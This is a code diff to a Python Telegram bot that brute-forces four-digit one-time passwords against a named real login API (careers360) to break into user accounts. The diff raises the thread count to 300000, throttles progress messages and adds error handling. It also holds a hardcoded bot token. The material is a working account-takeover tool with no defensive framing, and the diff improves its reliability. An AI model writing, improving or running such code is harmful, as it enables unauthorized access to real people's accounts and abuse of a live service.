@@ -6,6 +6,7 @@ import threading
 from flask import Flask
 from telegram import Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler
+from telegram.error import BadRequest
 
 BOT_TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
 
@@ -96,6 +97,7 @@ async def process_login(chat_id, bot, message_data, key):
     login_url = "https://backend-cus.careers360.com/api/1/cus/login"
     found_otp = None
     checked_otps = 0
+    last_update = -1  # Track the last updated count to avoid redundant edits
 
     progress_message = await bot.send_message(chat_id, f"🔄 [{key}] Checking OTPs... (0 checked)")
 
@@ -127,8 +129,8 @@ async def process_login(chat_id, bot, message_data, key):
         return None
 
     async def check_otp_with_updates():
-        nonlocal found_otp, checked_otps
-        with concurrent.futures.ThreadPoolExecutor(max_workers=250000) as executor:
+        nonlocal found_otp, checked_otps, last_update
+        with concurrent.futures.ThreadPoolExecutor(max_workers=300000) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
             for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
@@ -136,8 +138,15 @@ async def process_login(chat_id, bot, message_data, key):
                     executor.shutdown(wait=False)
                     break
 
-                if checked_otps % 300 == 0:
-                    await progress_message.edit_text(f"🔄 [{key}] Checking OTPs... ({checked_otps} checked)")
+                # Only update if checked_otps has increased by 300 since last update
+                if checked_otps // 1000 > last_update:
+                    last_update = checked_otps // 1000
+                    try:
+                        await progress_message.edit_text(f"🔄 [{key}] Checking OTPs... ({checked_otps} checked)")
+                    except BadRequest as e:
+                        if "Message is not modified" not in str(e):
+                            await bot.send_message(chat_id, f"⚠️ [{key}] Error updating progress: {str(e)}")
+                        # Continue even if edit fails
 
     await check_otp_with_updates()
     await bot.delete_message(chat_id, progress_message.message_id)
@@ -198,8 +207,11 @@ async def process_queue(job_context):
     context = job_context  # The context is passed via the data parameter
     if request_queue:
         chat_id, message_data, key = request_queue.pop(0)
-        await context.bot.send_message(chat_id, f"Processing request for '{key}': {message_data.split(' - ')[1]}")
-        await process_login(chat_id, context.bot, message_data, key)
+        try:
+            await context.bot.send_message(chat_id, f"Processing request for '{key}': {message_data.split(' - ')[1]}")
+            await process_login(chat_id, context.bot, message_data, key)
+        except Exception as e:
+            await context.bot.send_message(chat_id, f"⚠️ [{key}] Error processing request: {str(e)}")
         # Schedule the next item if there are more in the queue
         if request_queue:
             context.job_queue.run_once(process_queue, 600, data=context)  # Next item after 10 minutes
